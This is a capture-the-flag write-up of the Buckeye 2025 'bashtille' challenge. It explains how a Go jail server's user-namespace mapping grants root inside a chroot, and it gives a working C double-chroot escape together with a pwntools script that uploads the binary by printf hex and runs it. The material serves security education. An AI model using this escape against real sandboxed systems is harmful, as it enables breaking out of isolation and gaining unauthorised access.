---
title: "Buckeye 2025 – bashtille: escaping chroot jail by exploiting misconfiguration"
date: 2025-11-11
toc: true
---

![](https://github.com/user-attachments/assets/7aaba68c-e660-4fb9-b0ef-2fd63d0a11da)

> Abused the server misconfiguration in the user-namespace mapping which gave us effective root inside the container to escape chroot by using a exploit that chroots inside the chroot to escape the jail.

We were given the following files:

```
$ ls -la    
total 16
drwxrwxr-x 2 kali kali 4096 Nov  9 12:53 .
drwxrwxr-x 3 kali kali 4096 Nov 10 10:41 ..
-rwxrw-rw- 1 kali kali 2320 Dec 31  1979 bashtille.go
-rwxrw-rw- 1 kali kali  315 Dec 31  1979 Dockerfile

$ cat Dockerfile
FROM golang:1.25.0 AS builder
COPY bashtille.go ./
RUN go build bashtille.go

FROM debian
RUN mkdir /app
RUN mkdir -m 0333 /app/jails
USER 1000
WORKDIR /app
COPY flag.txt /app/flag.txt
COPY --from=builder /go/bashtille /app/bashtille
CMD ["/bin/bash", "-c", "while true; do timeout 1h /app/bashtille server; done"]
```

The `Dockerfile` tells us the docker compiles `bashtille.go` program using `go build` and runs it via `/app/bashtille server`.

Looking at `bashtille.go`, we can see that the program parses the first argument passing via command line and, if it's server/child it calls the `server()`/`child()` function respectively.

```go
func main() {
  switch os.Args[1] {
  case "server":
    server()
  case "child":
    child(os.Args[2])
  default:
    panic("help")
  }
}
```

`server()` functions sets up a listener on `:5000` port and, for each connection it passes the context to `handleConnection` with a `60 second` timeout.

```go
func server() {
  listener, err := net.Listen("tcp", ":5000")
  if err != nil {
    log.Fatal("Failed to start server:", err)
  }
  defer listener.Close()

  log.Println("Listening on port 5000...")

  for {
    conn, err := listener.Accept()
    if err != nil {
      log.Println("Connection error:", err)
      continue
    }
    ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
    go func() {
      defer cancel()
      defer runtime.GC()
      handleConnection(ctx, conn)
    }()
  }
}
```

`handleConnection()` closes the connection, creates a variable `dir` initialized to `/app/jails/<radomHex(16)>`, creates a `exe.CommandContext` to executes itself (`/proc/self/exe -> /app/bashtille`) with cmdline arguments `child` and variable `dir` with `stdout`, `stdin` and, `stderr` set to our connection so we can interact the with program and, creates new namespace to isolate the process with new `UTS` namespace (`syscall.CLONE_NEWUTS`) for isolated domain/hostname, `PID` namespace (`syscall.CLONE_NEWPID`), `mount` namespace (`syscall.CLONE_NEWNS`) to isolate filesystem mounts and user namespace (`syscall.CLONE_NEWUSER`) which allows mapping of userids for privilege isolations finally mapping `ContainerID` to `0` (root inside the container) and, `HostID` to `1000` (normal user). 

```go
func handleConnection(ctx context.Context, conn net.Conn) {
  defer conn.Close()

  dir := "/app/jails/" + randomHex(16)

  cmd := exec.CommandContext(ctx, "/proc/self/exe", "child", dir)
  cmd.Stdin = conn
  cmd.Stdout = conn
  cmd.Stderr = conn
  cmd.SysProcAttr = &syscall.SysProcAttr{
    Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS | syscall.CLONE_NEWUSER,
    UidMappings: []syscall.SysProcIDMap{
      {
        ContainerID: 0,
        HostID:      1000,
        Size:        1,
      },
    },
    Unshareflags: syscall.CLONE_NEWNS,
  }

  _ = cmd.Run()

  os.RemoveAll(dir)
}
```

Now, let's take a look what happens when, the `handleConnection()` executes `/app/bashtille child <dir>`. If the first argument is `child`, `main()` function parses the second argument and calls the `child()` function with the second argument. 

```go
func main() {
  switch os.Args[1] {
...SNIP...
  case "child":
    child(os.Args[2])
...SNIP...
  }
}
```

`child()` creates `/bin`, `/lib/x86_64-linux-gnu` and `/lib64` in the directory passed to it which is `/app/jails/<randomHex(16)>`, copies `/bin/bash`, `/lib/x86_64-linux-gnu/libtinfo.so.6`, `/lib/x86_64-linux-gnu/libc.so.6` and, `/lib64/ld-linux-x86-64.so.2` into the jail directory, chroots into the `/app/jails/<randomHex(16)>`, changes current directory to `/` and executes `/bin/bash -i`.

```go
func child(dir string) {
  must(syscall.Mkdir(dir, 0700))
  must(syscall.Mkdir(dir+"/bin", 0700))
  must(syscall.Mkdir(dir+"/lib", 0700))
  must(syscall.Mkdir(dir+"/lib/x86_64-linux-gnu", 0700))
  must(syscall.Mkdir(dir+"/lib64", 0700))

  copy("/bin/bash", dir+"/bin/bash")
  copy("/lib/x86_64-linux-gnu/libtinfo.so.6", dir+"/lib/x86_64-linux-gnu/libtinfo.so.6")
  copy("/lib/x86_64-linux-gnu/libc.so.6", dir+"/lib/x86_64-linux-gnu/libc.so.6")
  copy("/lib64/ld-linux-x86-64.so.2", dir+"/lib64/ld-linux-x86-64.so.2")

  must(syscall.Chroot(dir))

  must(os.Chdir("/"))

  cmd := exec.Command("/bin/bash", "-i")
  cmd.Stdin = os.Stdin
  cmd.Stdout = os.Stdout
  cmd.Stderr = os.Stderr

  _ = cmd.Run()
}
```

> For those that are not familiar `chroot` is a syscall on unix that sets the root directory to the directory specified so, you can't access anything binaries included in the directories above the one we are chrooting into creating sort of a container.
> 
> https://man7.org/linux/man-pages/man2/chroot.2.html
> 
> https://en.wikipedia.org/wiki/Chroot

Now, the misconfiguration in this program is that it sets the `ContainerID` to `0` (root on the container).

```bash
$ ncat --ssl bashtille.challs.pwnoh.io 1337 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2# echo "$EUID"
0
```

As, we are root we can breakout of the chroot jail by performing another chroot. 
> https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  chroot(".");
  chdir("../../../");
  chroot(".");
  system("/bin/bash");
}
```

The biggest problem here is the question of how do we get the binary on the server? The answer to that is we can use `printf` which supports taking taking in hex string and writing it to a file.

```
$ ncat --ssl bashtille.challs.pwnoh.io 1337 
...SNIP...
bash-5.2# printf '\x61\x62\x63\x0a' > test
bash-5.2# while IFS= read -r line; do echo "$line"; done < test
abc
```

We can convert the binary to this using `python`:

```
$ python3 - <<'PY' > exploit.hex
import sys
sys.stdout.write("".join("\\x%02x"%b for b in open("exploit","rb").read()))
PY
```

Once we have the binary on the server we can use `/lib64/ld-linux-x86-64.so.2` to run it like this `/lib64/ld-linux-x86-64.so.2 ./exploit` using the following script which reads the `exploit.hex` and, runs `printf '<contents of exploit.hex>' > exploit` and, `/lib64/ld-linux-x86-64.so.2 ./exploit`.

```python
from pwn import *

io = remote("bashtille.challs.pwnoh.io", 1337, ssl=True)

io.sendlineafter(b"# ", f"printf '{open('exploit.hex', 'r').read()}' > exploit".encode())
io.sendlineafter(b"# ", b"/lib64/ld-linux-x86-64.so.2 ./exploit")
io.interactive()
```

![](https://github.com/user-attachments/assets/a246ae7b-d5c1-4973-a893-5bb50a1fd9ce)
